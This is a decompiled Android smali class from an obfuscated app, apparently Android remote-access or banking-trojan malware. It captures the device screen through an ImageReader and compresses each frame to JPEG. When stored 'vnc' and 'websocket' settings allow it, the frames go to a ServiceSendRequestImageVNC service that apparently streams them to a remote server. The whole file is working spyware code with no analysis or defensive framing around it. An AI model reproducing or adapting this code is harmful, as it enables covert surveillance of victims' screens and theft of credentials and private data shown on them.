.class public Lnaqsl/ebxcb/exu/API/Screenshot/fddo;
.super Ljava/lang/Object;
.source ""

# interfaces
.implements Landroid/media/ImageReader$OnImageAvailableListener;


# annotations
.annotation build Landroid/annotation/TargetApi;
    value = 0x15
.end annotation


# instance fields
.field private final fddo:I

.field private final for:Landroid/media/ImageReader;

.field private final ifdf:I

.field private final int:Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;

.field private new:Landroid/graphics/Bitmap;

.field try:Lnaqsl/ebxcb/exu/int;


# direct methods
.method constructor <init>(Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;)V
    .registers 7

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    const/4 v0, 0x0

    iput-object v0, p0, Lnaqsl/ebxcb/exu/API/Screenshot/fddo;->new:Landroid/graphics/Bitmap;

    new-instance v0, Lnaqsl/ebxcb/exu/int;

    invoke-direct {v0}, Lnaqsl/ebxcb/exu/int;-><init>()V

    iput-object v0, p0, Lnaqsl/ebxcb/exu/API/Screenshot/fddo;->try:Lnaqsl/ebxcb/exu/int;

    iput-object p1, p0, Lnaqsl/ebxcb/exu/API/Screenshot/fddo;->int:Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;

    invoke-virtual {p1}, Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;->ifdf()Landroid/view/WindowManager;

    move-result-object v0

    invoke-interface {v0}, Landroid/view/WindowManager;->getDefaultDisplay()Landroid/view/Display;

    move-result-object v0

    new-instance v1, Landroid/graphics/Point;

    invoke-direct {v1}, Landroid/graphics/Point;-><init>()V

    invoke-virtual {v0, v1}, Landroid/view/Display;->getSize(Landroid/graphics/Point;)V

    iget v0, v1, Landroid/graphics/Point;->x:I

    iget v2, v1, Landroid/graphics/Point;->y:I

    const/16 v3, 0x320

    const/4 v4, 0x2

    if-lez v0, :cond_2d

    if-gt v0, v3, :cond_2d

    div-int/2addr v0, v4

    div-int/2addr v2, v4

    goto :goto_4e

    :cond_2d
    const/16 v2, 0x640

    if-le v0, v3, :cond_3c

    if-gt v0, v2, :cond_3c

    iget v0, v1, Landroid/graphics/Point;->x:I

    div-int/lit8 v0, v0, 0x3

    iget v1, v1, Landroid/graphics/Point;->y:I

    div-int/lit8 v2, v1, 0x3

    goto :goto_4e

    :cond_3c
    if-le v0, v2, :cond_47

    iget v0, v1, Landroid/graphics/Point;->x:I

    div-int/lit8 v0, v0, 0x4

    iget v1, v1, Landroid/graphics/Point;->y:I

    div-int/lit8 v2, v1, 0x4

    goto :goto_4e

    :cond_47
    iget v0, v1, Landroid/graphics/Point;->x:I

    div-int/2addr v0, v4

    iget v1, v1, Landroid/graphics/Point;->y:I

    div-int/lit8 v2, v1, 0x2

    :goto_4e
    mul-int v1, v0, v2

    const/high16 v3, 0x100000

    if-le v1, v3, :cond_59

    shr-int/lit8 v0, v0, 0x1

    shr-int/lit8 v2, v2, 0x1

    goto :goto_4e

    :cond_59
    iput v0, p0, Lnaqsl/ebxcb/exu/API/Screenshot/fddo;->fddo:I

    iput v2, p0, Lnaqsl/ebxcb/exu/API/Screenshot/fddo;->ifdf:I

    const/4 v1, 0x1

    invoke-static {v0, v2, v1, v4}, Landroid/media/ImageReader;->newInstance(IIII)Landroid/media/ImageReader;

    move-result-object v0

    iput-object v0, p0, Lnaqsl/ebxcb/exu/API/Screenshot/fddo;->for:Landroid/media/ImageReader;

    iget-object v0, p0, Lnaqsl/ebxcb/exu/API/Screenshot/fddo;->for:Landroid/media/ImageReader;

    invoke-virtual {p1}, Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;->fddo()Landroid/os/Handler;

    move-result-object p1

    invoke-virtual {v0, p0, p1}, Landroid/media/ImageReader;->setOnImageAvailableListener(Landroid/media/ImageReader$OnImageAvailableListener;Landroid/os/Handler;)V

    return-void
.end method


# virtual methods
.method fddo()I
    .registers 2

    iget v0, p0, Lnaqsl/ebxcb/exu/API/Screenshot/fddo;->ifdf:I

    return v0
.end method

.method for()I
    .registers 2

    iget v0, p0, Lnaqsl/ebxcb/exu/API/Screenshot/fddo;->fddo:I

    return v0
.end method

.method ifdf()Landroid/view/Surface;
    .registers 2

    iget-object v0, p0, Lnaqsl/ebxcb/exu/API/Screenshot/fddo;->for:Landroid/media/ImageReader;

    invoke-virtual {v0}, Landroid/media/ImageReader;->getSurface()Landroid/view/Surface;

    move-result-object v0

    return-object v0
.end method

.method public onImageAvailable(Landroid/media/ImageReader;)V
    .registers 8

    iget-object p1, p0, Lnaqsl/ebxcb/exu/API/Screenshot/fddo;->for:Landroid/media/ImageReader;

    invoke-virtual {p1}, Landroid/media/ImageReader;->acquireLatestImage()Landroid/media/Image;

    move-result-object p1

    if-eqz p1, :cond_b3

    invoke-virtual {p1}, Landroid/media/Image;->getPlanes()[Landroid/media/Image$Plane;

    move-result-object v0

    const/4 v1, 0x0

    aget-object v2, v0, v1

    invoke-virtual {v2}, Landroid/media/Image$Plane;->getBuffer()Ljava/nio/ByteBuffer;

    move-result-object v2

    aget-object v3, v0, v1

    invoke-virtual {v3}, Landroid/media/Image$Plane;->getPixelStride()I

    move-result v3

    aget-object v0, v0, v1

    invoke-virtual {v0}, Landroid/media/Image$Plane;->getRowStride()I

    move-result v0

    iget v4, p0, Lnaqsl/ebxcb/exu/API/Screenshot/fddo;->fddo:I

    mul-int v5, v3, v4

    sub-int/2addr v0, v5

    div-int/2addr v0, v3

    add-int/2addr v4, v0

    iget-object v0, p0, Lnaqsl/ebxcb/exu/API/Screenshot/fddo;->new:Landroid/graphics/Bitmap;

    if-eqz v0, :cond_3a

    invoke-virtual {v0}, Landroid/graphics/Bitmap;->getWidth()I

    move-result v0

    if-ne v0, v4, :cond_3a

    iget-object v0, p0, Lnaqsl/ebxcb/exu/API/Screenshot/fddo;->new:Landroid/graphics/Bitmap;

    invoke-virtual {v0}, Landroid/graphics/Bitmap;->getHeight()I

    move-result v0

    iget v3, p0, Lnaqsl/ebxcb/exu/API/Screenshot/fddo;->ifdf:I

    if-eq v0, v3, :cond_4b

    :cond_3a
    iget-object v0, p0, Lnaqsl/ebxcb/exu/API/Screenshot/fddo;->new:Landroid/graphics/Bitmap;

    if-eqz v0, :cond_41

    invoke-virtual {v0}, Landroid/graphics/Bitmap;->recycle()V

    :cond_41
    iget v0, p0, Lnaqsl/ebxcb/exu/API/Screenshot/fddo;->ifdf:I

    sget-object v3, Landroid/graphics/Bitmap$Config;->ARGB_8888:Landroid/graphics/Bitmap$Config;

    invoke-static {v4, v0, v3}, Landroid/graphics/Bitmap;->createBitmap(IILandroid/graphics/Bitmap$Config;)Landroid/graphics/Bitmap;

    move-result-object v0

    iput-object v0, p0, Lnaqsl/ebxcb/exu/API/Screenshot/fddo;->new:Landroid/graphics/Bitmap;

    :cond_4b
    iget-object v0, p0, Lnaqsl/ebxcb/exu/API/Screenshot/fddo;->new:Landroid/graphics/Bitmap;

    invoke-virtual {v0, v2}, Landroid/graphics/Bitmap;->copyPixelsFromBuffer(Ljava/nio/Buffer;)V

    if-eqz p1, :cond_55

    invoke-virtual {p1}, Landroid/media/Image;->close()V

    :cond_55
    new-instance p1, Ljava/io/ByteArrayOutputStream;

    invoke-direct {p1}, Ljava/io/ByteArrayOutputStream;-><init>()V

    iget-object v0, p0, Lnaqsl/ebxcb/exu/API/Screenshot/fddo;->new:Landroid/graphics/Bitmap;

    iget v2, p0, Lnaqsl/ebxcb/exu/API/Screenshot/fddo;->fddo:I

    iget v3, p0, Lnaqsl/ebxcb/exu/API/Screenshot/fddo;->ifdf:I

    invoke-static {v0, v1, v1, v2, v3}, Landroid/graphics/Bitmap;->createBitmap(Landroid/graphics/Bitmap;IIII)Landroid/graphics/Bitmap;

    move-result-object v0

    sget-object v1, Landroid/graphics/Bitmap$CompressFormat;->JPEG:Landroid/graphics/Bitmap$CompressFormat;

    const/16 v2, 0x64

    invoke-virtual {v0, v1, v2, p1}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z

    invoke-virtual {p1}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object p1

    iget-object v0, p0, Lnaqsl/ebxcb/exu/API/Screenshot/fddo;->try:Lnaqsl/ebxcb/exu/int;

    iget-object v1, p0, Lnaqsl/ebxcb/exu/API/Screenshot/fddo;->int:Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;

    const-string v2, "vnc"

    invoke-virtual {v0, v1, v2}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "stop"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_a6

    iget-object v0, p0, Lnaqsl/ebxcb/exu/API/Screenshot/fddo;->try:Lnaqsl/ebxcb/exu/int;

    iget-object v1, p0, Lnaqsl/ebxcb/exu/API/Screenshot/fddo;->int:Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;

    const-string v2, "websocket"

    invoke-virtual {v0, v1, v2}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v1, ""

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_94

    goto :goto_a6

    :cond_94
    iget-object v0, p0, Lnaqsl/ebxcb/exu/API/Screenshot/fddo;->int:Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;

    invoke-virtual {v0, p1}, Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;->fddo([B)V

    iget-object p1, p0, Lnaqsl/ebxcb/exu/API/Screenshot/fddo;->int:Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;

    new-instance v0, Landroid/content/Intent;

    const-class v1, Lnaqsl/ebxcb/exu/API/Screenshot/ServiceSendRequestImageVNC;

    invoke-direct {v0, p1, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p1, v0}, Landroid/app/Service;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    goto :goto_b3

    :cond_a6
    :goto_a6
    iget-object p1, p0, Lnaqsl/ebxcb/exu/API/Screenshot/fddo;->int:Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;

    const/4 v0, 0x1

    invoke-virtual {p1, v0}, Landroid/app/Service;->stopForeground(Z)V

    iget-object p1, p0, Lnaqsl/ebxcb/exu/API/Screenshot/fddo;->int:Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;

    iget-object v0, p1, Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;->long:Landroid/content/Intent;

    invoke-virtual {p1, v0}, Landroid/app/Service;->stopService(Landroid/content/Intent;)Z

    :cond_b3
    :goto_b3
    return-void
.end method
